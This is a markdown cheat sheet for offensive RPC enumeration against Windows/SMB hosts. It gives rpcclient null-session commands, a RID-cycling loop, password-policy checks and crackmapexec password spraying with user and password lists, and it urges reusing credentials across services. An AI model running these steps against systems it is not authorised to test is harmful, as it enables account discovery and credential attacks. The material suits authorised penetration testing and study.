# RPC Enumeration & Exploitation

## Purpose

This file provides a structured workflow for enumerating RPC services and extracting users, groups, and access information.

Core rules:

* RPC is a primary user enumeration vector
* Always attempt null session first
* Build username lists early
* Feed results into SMB, LDAP, and password attacks

---

## 0. Identify RPC

Common ports:

* 135 (RPC endpoint mapper)
* 139 / 445 (SMB over RPC)

Confirm:

```bash id="j7v2yf"
nmap -p 135,139,445 -sV <IP>
```

---

## 1. Null Session Check (CRITICAL FIRST STEP)

```bash id="3l3o2j"
rpcclient -U "" -N <IP>
```

If access granted:
→ high value enumeration available

---

## 2. Basic RPC Enumeration

Inside rpcclient:

```bash id="nrd0z1"
enumdomusers
enumdomgroups
enumdomaliases
```

---

## 3. Extract Users

```bash id="3zpg0v"
enumdomusers
```

Save:

* usernames → users.txt

Used for:

* password spraying
* Kerberos attacks
* SMB login attempts

---

## 4. Extract Groups

```bash id="6n8p4u"
enumdomgroups
```

Look for:

* Domain Admins
* Administrators
* Backup Operators
* Remote Desktop Users

---

## 5. Query Specific User

```bash id="o0c6h3"
queryuser <RID>
```

Use:

* identify user details
* check descriptions

---

## 6. RID Cycling (HIGH VALUE)

Automate user discovery:

```bash id="v3km2f"
for i in $(seq 500 1100); do rpcclient -N -U "" <IP> -c "queryuser $i" 2>/dev/null; done
```

Extract:

* usernames
* descriptions

---

## 7. Enumerate Shares via RPC

```bash id="u9a0y1"
netshareenum
```

Look for:

* readable shares
* writable shares
* sensitive data locations

---

## 8. Password Policy

```bash id="jpx7yo"
getdompwinfo
```

Use to determine:

* lockout thresholds
* safe password spraying strategy

---

## 9. Enum4linux (Wrapper Tool)

```bash id="m2j0kl"
enum4linux -a <IP>
```

Covers:

* users
* groups
* shares
* policy

---

## 10. CrackMapExec Integration

```bash id="5c0v7q"
crackmapexec smb <IP>
```

With creds:

```bash id="8s0m2n"
crackmapexec smb <IP> -u user -p pass
```

---

## 11. Credential Testing

Once users are found:

Test:

```bash id="xg2pl5"
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

---

## 12. Combine with SMB

RPC findings → feed into SMB:

```bash id="n2k6g7"
smbclient -L //<IP> -N
```

---

## 13. Combine with LDAP

Use RPC users for:

* LDAP enumeration
* Kerberos attacks

---

## 14. Pivot Opportunities

RPC can reveal:

* valid usernames
* accessible shares
* domain structure

---

## 15. If Null Session Fails

Try:

* known credentials
* password spraying
* SMB enumeration instead

---

## 16. If Stuck

RESET:

* rerun enumdomusers
* perform RID cycling
* re-check shares
* combine with SMB + LDAP

---

## 17. Mental Model

* RPC = user discovery engine
* Users = attack surface
* More users = more chances for creds

---

## 18. Golden Rules

* Always try null session first
* Always extract usernames
* Always save users to file
* Always reuse credentials across services
